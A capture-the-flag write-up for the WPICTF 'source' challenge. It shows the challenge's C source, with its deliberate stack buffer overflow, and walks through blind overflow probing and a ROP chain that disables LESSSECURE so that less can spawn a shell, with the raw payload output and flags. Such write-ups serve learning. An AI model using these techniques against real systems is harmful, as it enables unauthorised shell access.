# Source part1, part2
## TLDR
- Part1: send "A"*110
- Part2: build rop to "setenv(LESSSECURE, "NULL", 1) -> spawn less -> !sh
## Summery of this problem
1. connect ssh
2. input password
3. if it's OK, exevcp "less source.c"


```
$ ssh source@source.wpictf.xyz -p 31337
source@source.wpictf.xyz's password: 
Enter the password to get access to https://www.imdb.com/title/tt0945513/
im bob
Pasword auth failed
exiting
Connection to source.wpictf.xyz closed.
```

## Part1
We have no binary so this is blind challenge.  
First, I tried some stirngs like,
```
$ ssh source@source.wpictf.xyz -p 31337
source@source.wpictf.xyz's password: 
Enter the password to get access to https://www.imdb.com/title/tt0945513/
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
Connection to source.wpictf.xyz closed.
```
There are no response if the input length is too long. So, there is BoF here.  
Next, I try to adjust the length and if length = 110,

```
$ ssh source@source.wpictf.xyz -p 31337
source@source.wpictf.xyz's password: 
Enter the password to get access to https://www.imdb.com/title/tt0945513/
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMA
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>

#include <stdlib.h>
#include <string.h>

//compiled with gcc source.c -o source -fno-stack-protector -no-pie
//gcc (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0

//flag for source1 is WPI{Typos_are_GrEaT!}
int getpw(void){
        int res = 0;
        char pw[100];

        fgets(pw, 0x100, stdin);
        *strchrnul(pw, '\n') = 0;
        if(!strcmp(pw, getenv("SOURCE1_PW"))) res = 1;
        return res;
}

char *lesscmd[] = {"less", "source.c", 0};
int main(void){
        setenv("LESSSECURE", "1", 1);
        printf("Enter the password to get access to https://www.imdb.com/title/tt0945513/\n");
        if(!getpw()){
                printf("Pasword auth failed\nexiting\n");
                return 1;
        }

        execvp(lesscmd[0], lesscmd);
        return 0;
}
source.c (END)

```
flag:WPI{Typos_are_GrEaT!}


## Part2
Now we have source.c. Let's compile with gcc in native ubuntu18.04. # And I could't do this on time :((((
In this binary, there are no strigns like "/bin/sh" nor we have no write gadget like "mov [rax], rsi", so that we can't spawn shell.   
There is "!" command in "less". By using this function, we can spawn shell. But "setenv("LESSSECURE", "1", 1);" prevents us from the shell.  

So, the solution is,
1. get ret addr using BoF
2. build rop to setenv("LESSSECURE", "NULL", 1); # NOT "0"!!! see solve.py for detail.
3. spawn "less"

Care when spawning shell, we can't input with default key. Use "Ctrl + Enter" to input Enter. # I don't know why.

```
[*] Switching to interactive mode

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^A^@^@^@^@^@^@^@<^H@^@^@^@^@^@0^P`^@^@^@^@^@\x83^H@^@^@^@^@^@\xa0^P`^@^@^@^@^@^A^@^@^@^@^@^@^@ ^H@^@^@^@^@^@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb4^G@^@^@^@^@^@
$ ls
ls
flag.txt  run_problem.sh  source  source.c
$ cat f*
cat f*
WPI{lesssecure_is_m0resecure}
``` 
flag:WPI{lesssecure_is_m0resecure}
